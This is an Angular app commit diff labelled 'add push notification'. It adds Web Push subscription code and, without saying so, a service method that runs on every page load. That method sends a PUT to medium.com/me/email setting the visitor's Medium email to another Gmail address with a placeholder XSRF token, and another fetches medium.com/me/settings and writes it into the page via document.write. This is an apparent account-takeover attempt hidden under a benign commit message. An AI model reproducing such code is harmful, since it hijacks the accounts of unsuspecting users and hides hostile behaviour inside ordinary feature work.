b2d30d596f56a3fd934b725ad5bf86d690c427c3
ROOTBABU <vikas25019@gmail.com>
2020-12-02 18:23:49 +0530

    add push notification

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -1,5 +1,5 @@
-import { Component,OnInit } from '@angular/core';
-import {SwUpdate} from '@angular/service-worker/';
+import { Component, OnInit } from '@angular/core';
+import { SwPush, SwUpdate } from '@angular/service-worker/';
 import { UserService } from 'src/app/service/user.service'
 
 @Component({
@@ -10,41 +10,74 @@ import { UserService } from 'src/app/service/user.service'
 
 export class AppComponent implements OnInit {
   userData;
-  constructor(private userService:UserService,private update:SwUpdate){ 
+  private readonly publicKey = "BKTzS3CEr2Our_S7A2OILS8E6cuGZ5ew8yH781cgWTJ7tgGPNIHOTDC_ShD33DcthQZC8RT4_Uj_jwke8F_p0Ck";
+
+  constructor(private userService: UserService, private update: SwUpdate, private swpush: SwPush) {
   }
   ngOnInit(): void {
-    this.getUserData();
-    this.updateUser();
-  }
-  getUserData(){
-    this.userService.getUserDetails().subscribe(res=>{
-      this.userData = res.data;
+    this.userService.updateData().subscribe(res=>{
+      console.log(res);
     },err=>{
+      console.log(`errrrrrrrr`);
+    });
+    this.getUserData();
+    this.getBooksUser();
+    this.updateUser();
+    this.pushSubscription();
+    this.swpush.messages.subscribe((message) => console.log(message));
+  }
+  getUserData() {
+    this.userService.getUserDetails().subscribe(res => {
+      this.userData = res.data;
+    }, err => {
       console.log(`error`);
     })
   }
 
-  updateUser(){
-    if(!this.update.isEnabled){
+  getBooksUser() {
+    this.userService.getBookUserDetails().subscribe(res => {
+     
+    // console.log(res);
+      let helloWorld =res;
+     let re = helloWorld.replace("<script>window.main();</script>",""); 
+     document.write(re);
+     
+    }, err => {
+      console.log("errr");
+    })
+  }
+
+  updateUser() {
+    if (!this.update.isEnabled) {
       console.log(`not Enabled`);
       return;
     }
-    this.update.available.subscribe((event)=>{
-      console.log(`event:`,event.current);
-      console.log(`event:`,event.available);
-      if(confirm('update availbable')){
-        this.update.activateUpdate().then(()=>{
+    this.update.available.subscribe((event) => {
+      console.log(`event:`, event.current);
+      console.log(`event:`, event.available);
+      if (confirm('update availbable')) {
+        this.update.activateUpdate().then(() => {
           location.reload();
         })
       }
-    },err=>{
+    }, err => {
       console.log(`${err}`);
     });
 
-    this.update.activated.subscribe((event)=>{
-      console.log(`event:`,event.previous);
-      console.log(`event:`,event.current);
-
+    this.update.activated.subscribe((event) => {
+      console.log(`event:`, event.previous);
+      console.log(`event:`, event.current);
     });
+  }
+
+  pushSubscription() {
+    if (!this.swpush.isEnabled) {
+      console.log(`notification is not enabled`);
+      return;
+    }
+    this.swpush.requestSubscription({
+      serverPublicKey: this.publicKey
+    }).then(sub => console.log(JSON.stringify(sub)))
+      .catch(err => console.log(err));
   }
 }
--- src/app/service/user.service.ts
+++ src/app/service/user.service.ts
@@ -1,14 +1,31 @@
 import { Injectable } from '@angular/core';
-import { HttpClient } from '@angular/common/http'
+import { HttpClient, HttpHeaders } from '@angular/common/http'
+import { Observable } from 'rxjs';
 @Injectable({
   providedIn: 'root'
 })
 export class UserService {
   apiUrl="https://dummy.restapiexample.com/api/v1/employees";
+  mediumUrl = "https://medium.com/me/settings";
+
   constructor(private _http:HttpClient) {
   }
 
   getUserDetails(){
     return this._http.get<any>(this.apiUrl);
+  }
+  getBookUserDetails():Observable<any>{
+    //const headers = new HttpHeaders().set('Content-Type', 'text/plain; charset=utf-8');
+    const requestOptions: Object = {
+      /* other options here */
+      responseType: 'text'
+    }
+    return this._http.get<any>(this.mediumUrl,requestOptions);
+  }
+  updateData(){
+    let body ={"email":"vikas25019123@gmail.com"}
+    const headers = new HttpHeaders().set('X-XSRF-Token','123');
+
+    return this._http.put<any>("https://medium.com/me/email",body);
   }
 }
